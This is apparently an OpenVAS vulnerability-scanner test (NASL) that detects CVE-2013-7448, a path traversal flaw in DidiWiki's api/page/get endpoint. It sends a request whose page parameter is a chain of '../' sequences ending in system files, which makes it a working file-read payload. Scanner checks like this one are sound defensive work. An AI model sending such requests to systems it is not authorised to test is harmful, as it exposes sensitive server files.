###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_didiwiki_path_traversal_vuln.nasl 12338 2018-11-13 14:51:17Z asteins $
#
# DidiWiki Path Traversal Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:didiwiki_project:didiwiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807528");
  script_version("$Revision: 12338 $");
  script_cve_id("CVE-2013-7448");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-11-13 15:51:17 +0100 (Tue, 13 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-04-12 10:34:57 +0530 (Tue, 12 Apr 2016)");
  script_name("DidiWiki Path Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_didiwiki_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("DidiWiki/Installed");
  script_require_ports("Services/www", 8000);

  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2016/02/19/4");

  script_tag(name:"summary", value:"This host is installed with DidiWiki
  and is prone to path traversal.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"The flaw is due to an insufficient input
  validation via 'page' parameter to api/page/get in 'wiki.c' script");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files and to obtain sensitive information.");

  script_tag(name:"affected", value:"didiwiki versions 3.5.4 and prior");

  script_tag(name:"solution", value:"Apply the patch from advisory.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://didiwiki.wikidot.com");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit( 0 );
}

if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){

  url = dir + '/api/page/get?page=' + crap(data:"../", length:3*15) + files[file];

  if(http_vuln_check(port:http_port, url:url, pattern:file, check_header:TRUE)){
    report = report_vuln_url(port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}

exit(99);